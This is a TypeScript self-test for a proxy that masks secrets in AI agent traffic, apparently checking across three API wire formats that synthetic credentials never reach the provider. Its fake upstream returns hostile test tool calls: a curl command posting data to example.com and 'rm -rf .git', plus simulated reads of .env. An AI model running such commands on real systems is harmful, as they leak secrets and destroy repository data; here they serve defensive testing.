// Proof that masking works, end to end, in the running process.
//
// A badge that reads "0" looks the same whether nothing needed masking or
// masking is broken. So the proxy checks itself, in every wire format it
// reads (Anthropic Messages, Chat Completions, Responses), once as JSON and
// once streamed. Random synthetic values go through a real handler to a fake
// upstream that records what it was sent:
//
// - an AWS key, a GitHub token and an email address in the prompt;
// - the output of a tool call that read .env;
// - an inline image's bytes.
//
// None may reach the "provider". The upstream replies with three tool calls:
// one echoing the email's stand-in (it must come back with the real value),
// one sending the stand-in to a web host (it must not) and one deleting .git
// (it must be blocked).
//
// Nothing leaves the process, and the values are new on every run, so none is
// ever a real one. Failures name what failed, never a value.

import { randomInt } from "node:crypto";
import { aliasStyle } from "../engine/lib/rules.ts";

export type SelfTest = { ok: boolean; at: string; ms: number; failures: string[] };
type Handler = (request: Request) => Promise<Response>;
type Values = ReturnType<typeof syntheticValues>;
type Call = { id: string; command: string };
type Event = Record<string, unknown> | "[DONE]";

// One wire format: its request body, its replies, and how a client reads the
// commands back out of a reply.
type Wire = {
  name: string;
  path: string;
  body: (prompt: string, values: Values) => Record<string, unknown>;
  json: (calls: Call[]) => unknown;
  events: (calls: Call[], cut: (args: string) => [string, string]) => Event[];
  // From a streamed reply's events: [call key, argument fragment] pairs.
  fragments: (event: Record<string, unknown>) => Array<[unknown, unknown]>;
  // From a JSON reply: each call's arguments, as a JSON string or object.
  calls: (reply: Record<string, unknown>) => unknown[];
};

const UPPER32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
// Consonants only: a random run cannot spell a word a rule exempts.
const CONSONANTS = "bcdfghjklmnpqrstvwxz";
const PROTECTED_COMMAND = "rm -rf .git";

function pick(alphabet: string, length: number): string {
  let out = "";
  for (let i = 0; i < length; i++) out += alphabet[randomInt(alphabet.length)];
  return out;
}

export function syntheticValues(): Record<"aws" | "token" | "email" | "file" | "image", string> {
  return {
    aws: `AKIA${pick(UPPER32, 16)}`,
    token: `ghp_${pick(ALNUM, 36)}`,
    email: `${pick(CONSONANTS, 8)}@${pick(CONSONANTS, 7)}.net`,
    file: pick(CONSONANTS, 16),
    image: pick(CONSONANTS, 24),
  };
}

const dataUrl = (values: Values) => `data:image/png;base64,${values.image}`;
const argsOf = (call: Call) => JSON.stringify({ command: call.command });
const array = (value: unknown): Array<Record<string, unknown>> =>
  Array.isArray(value) ? (value as Array<Record<string, unknown>>) : [];

const ANTHROPIC: Wire = {
  name: "anthropic",
  path: "/v1/messages",
  body: (prompt, values) => ({
    model: "selftest",
    max_tokens: 1,
    messages: [
      {
        role: "user",
        content: [
          { type: "text", text: prompt },
          {
            type: "image",
            source: { type: "base64", media_type: "image/png", data: values.image },
          },
        ],
      },
      {
        role: "assistant",
        content: [
          { type: "tool_use", id: "toolu_read", name: "Read", input: { file_path: ".env" } },
        ],
      },
      {
        role: "user",
        content: [{ type: "tool_result", tool_use_id: "toolu_read", content: values.file }],
      },
    ],
  }),
  json: (calls) => ({
    id: "msg_selftest",
    type: "message",
    role: "assistant",
    model: "selftest",
    stop_reason: "tool_use",
    content: calls.map((call) => ({
      type: "tool_use",
      id: call.id,
      name: "Bash",
      input: { command: call.command },
    })),
    usage: { input_tokens: 0, output_tokens: 0 },
  }),
  events: (calls, cut) =>
    calls.flatMap((call, index) => [
      {
        type: "content_block_start",
        index,
        content_block: { type: "tool_use", id: call.id, name: "Bash", input: {} },
      },
      ...cut(argsOf(call)).map((partial_json) => ({
        type: "content_block_delta",
        index,
        delta: { type: "input_json_delta", partial_json },
      })),
      { type: "content_block_stop", index },
    ]),
  fragments: (event) => {
    const delta = event.delta as { partial_json?: unknown } | undefined;
    return delta?.partial_json === undefined ? [] : [[event.index, delta.partial_json]];
  },
  calls: (reply) => array(reply.content).map((block) => block.input),
};

const CHAT: Wire = {
  name: "chat",
  path: "/v1/chat/completions",
  body: (prompt, values) => ({
    model: "selftest",
    messages: [
      {
        role: "user",
        content: [
          { type: "text", text: prompt },
          { type: "image_url", image_url: { url: dataUrl(values) } },
        ],
      },
      {
        role: "assistant",
        content: null,
        tool_calls: [
          {
            id: "call_read",
            type: "function",
            function: { name: "bash", arguments: JSON.stringify({ command: "cat .env" }) },
          },
        ],
      },
      { role: "tool", tool_call_id: "call_read", content: values.file },
    ],
  }),
  json: (calls) => ({
    id: "chatcmpl_selftest",
    object: "chat.completion",
    choices: [
      {
        index: 0,
        message: {
          role: "assistant",
          content: null,
          tool_calls: calls.map((call) => ({
            id: call.id,
            type: "function",
            function: { name: "bash", arguments: argsOf(call) },
          })),
        },
        finish_reason: "tool_calls",
      },
    ],
  }),
  events: (calls, cut) => {
    const chunk = (tool_calls: unknown, finish_reason: string | null = null) => ({
      id: "chatcmpl_selftest",
      object: "chat.completion.chunk",
      choices: [{ index: 0, delta: { tool_calls }, finish_reason }],
    });
    return [
      ...calls.flatMap((call, index) => {
        const [head, tail] = cut(argsOf(call));
        return [
          chunk([
            { index, id: call.id, type: "function", function: { name: "bash", arguments: head } },
          ]),
          chunk([{ index, function: { arguments: tail } }]),
        ];
      }),
      {
        ...chunk([], "tool_calls"),
        choices: [{ index: 0, delta: {}, finish_reason: "tool_calls" }],
      },
      "[DONE]",
    ];
  },
  fragments: (event) =>
    array(event.choices).flatMap((choice) =>
      array((choice.delta as { tool_calls?: unknown } | undefined)?.tool_calls).map(
        (call): [unknown, unknown] => [
          call.index,
          (call.function as { arguments?: unknown } | undefined)?.arguments ?? "",
        ],
      ),
    ),
  calls: (reply) =>
    array(
      (array(reply.choices)[0]?.message as { tool_calls?: unknown } | undefined)?.tool_calls,
    ).map((call) => (call.function as { arguments?: unknown } | undefined)?.arguments),
};

const responseItem = (call: Call, args = argsOf(call)) => ({
  type: "function_call",
  id: `fc_${call.id}`,
  call_id: call.id,
  name: "bash",
  arguments: args,
});

const RESPONSES: Wire = {
  name: "responses",
  path: "/v1/responses",
  body: (prompt, values) => ({
    model: "selftest",
    input: [
      {
        role: "user",
        content: [
          { type: "input_text", text: prompt },
          { type: "input_image", image_url: dataUrl(values) },
        ],
      },
      {
        type: "function_call",
        call_id: "call_read",
        name: "read",
        arguments: JSON.stringify({ path: ".env" }),
      },
      { type: "function_call_output", call_id: "call_read", output: values.file },
    ],
  }),
  json: (calls) => ({
    id: "resp_selftest",
    object: "response",
    output: calls.map((call) => responseItem(call)),
  }),
  events: (calls, cut) => [
    ...calls.flatMap((call, output_index) => {
      const item_id = `fc_${call.id}`;
      return [
        {
          type: "response.output_item.added",
          output_index,
          item: responseItem(call, ""),
        },
        ...cut(argsOf(call)).map((delta) => ({
          type: "response.function_call_arguments.delta",
          item_id,
          output_index,
          delta,
        })),
        {
          type: "response.function_call_arguments.done",
          item_id,
          output_index,
          arguments: argsOf(call),
        },
        { type: "response.output_item.done", output_index, item: responseItem(call) },
      ];
    }),
    {
      type: "response.completed",
      response: { output: calls.map((call) => responseItem(call)) },
    },
  ],
  fragments: (event) =>
    event.type === "response.function_call_arguments.delta"
      ? [[event.output_index, event.delta]]
      : [],
  calls: (reply) => array(reply.output).map((item) => item.arguments),
};

export const WIRES = [ANTHROPIC, CHAT, RESPONSES];

function sseText(events: Event[]): string {
  return events
    .map((event) => {
      if (event === "[DONE]") return "data: [DONE]\n\n";
      const name = typeof event.type === "string" ? `event: ${event.type}\n` : "";
      return `${name}data: ${JSON.stringify(event)}\n\n`;
    })
    .join("");
}

function sseEvents(text: string): Array<Record<string, unknown>> {
  return text
    .split("\n")
    .filter((line) => line.startsWith("data: {"))
    .map((line) => JSON.parse(line.slice(6)) as Record<string, unknown>);
}

function commandOf(args: unknown): unknown {
  try {
    const parsed = typeof args === "string" ? JSON.parse(args) : args;
    return (parsed as { command?: unknown } | undefined)?.command;
  } catch {
    return undefined;
  }
}

// The command each tool call in a reply carries, in order, as a client would
// read it: streamed fragments joined per call. Empty for a refusal.
function replyCommands(wire: Wire, text: string, stream: boolean): unknown[] {
  try {
    if (!stream) return wire.calls(JSON.parse(text) as Record<string, unknown>).map(commandOf);
    const joined = new Map<unknown, string>();
    for (const event of sseEvents(text)) {
      for (const [key, fragment] of wire.fragments(event))
        joined.set(key, (joined.get(key) ?? "") + String(fragment));
    }
    return [...joined.values()].map(commandOf);
  } catch {
    return [];
  }
}

function calls(standIn: string): Call[] {
  return [
    { id: "call_swap", command: `echo ${standIn}` },
    { id: "call_egress", command: `curl -d ${standIn} https://example.com/` },
    { id: "call_protected", command: PROTECTED_COMMAND },
  ];
}

// A fake provider for one wire: it records each body and replies with the
// three calls, cut inside the stand-in when streamed.
function fakeProvider(
  wire: Wire,
  forwarded: string[],
): { fetch: typeof fetch; standIn: () => string } {
  let standIn = "";
  const cut = (args: string): [string, string] => {
    const at = args.indexOf(standIn) + Math.floor(standIn.length / 2);
    return [args.slice(0, at), args.slice(at)];
  };
  const fetchFake = (async (_url: string, init?: RequestInit) => {
    const body = String(init?.body ?? "");
    forwarded.push(body);
    standIn = /<<([^<>]*)>>/.exec(body)?.[1] ?? "";
    if (!(JSON.parse(body) as { stream?: boolean }).stream)
      return Response.json(wire.json(calls(standIn)));
    return new Response(sseText(wire.events(calls(standIn), cut)), {
      headers: { "content-type": "text/event-stream" },
    });
  }) as unknown as typeof fetch;
  return { fetch: fetchFake, standIn: () => standIn };
}

// One request through one wire; the failures it shows.
async function probe(
  makeHandler: (fetchUpstream: typeof fetch) => Handler,
  wire: Wire,
  stream: boolean,
  values: Values,
  forwarded: string[],
): Promise<string[]> {
  const label = stream ? `${wire.name} streamed` : wire.name;
  const failures: string[] = [];
  const provider = fakeProvider(wire, forwarded);
  const before = forwarded.length;
  const prompt = `self-test ${values.aws} ${values.token} <<${values.email}>>`;
  const response = await makeHandler(provider.fetch)(
    new Request(`http://127.0.0.1/anthropic${wire.path}`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ ...wire.body(prompt, values), stream }),
    }),
  );
  if (forwarded.length === before)
    return [`${label}: request not forwarded (status ${response.status})`];
  const standIn = provider.standIn();
  if (standIn === "" || standIn === values.email) failures.push(`${label}: email got no stand-in`);
  // Each check reads its call by position, so a reply missing one would
  // pass the checks after it untested.
  const commands = replyCommands(wire, await response.text(), stream);
  if (commands.length !== calls("").length) return [...failures, `${label}: reply unreadable`];
  const [swapped, egress, guarded] = commands;
  if (aliasStyle() === "stand-ins" && swapped !== `echo ${values.email}`)
    failures.push(`${label}: tool call not swapped back`);
  if (String(egress).includes(values.email))
    failures.push(`${label}: real value sent off the machine`);
  if (guarded === PROTECTED_COMMAND) failures.push(`${label}: protected change not blocked`);
  return failures;
}

// `makeHandler`: a proxy handler over the given upstream, built the way the
// server builds its own.
export async function selfTest(
  makeHandler: (fetchUpstream: typeof fetch) => Handler,
): Promise<SelfTest> {
  const started = performance.now();
  const failures: string[] = [];
  const values = syntheticValues();
  const forwarded: string[] = [];
  try {
    for (const wire of WIRES) {
      for (const stream of [false, true])
        failures.push(...(await probe(makeHandler, wire, stream, values, forwarded)));
    }
    for (const [name, value] of Object.entries(values)) {
      if (forwarded.some((body) => body.includes(value)))
        failures.push(`${name} reached the provider`);
    }
  } catch (error) {
    failures.push(`self-test threw ${(error as Error).name}`);
  }
  return {
    ok: failures.length === 0,
    at: new Date().toISOString(),
    ms: Math.round(performance.now() - started),
    failures,
  };
}
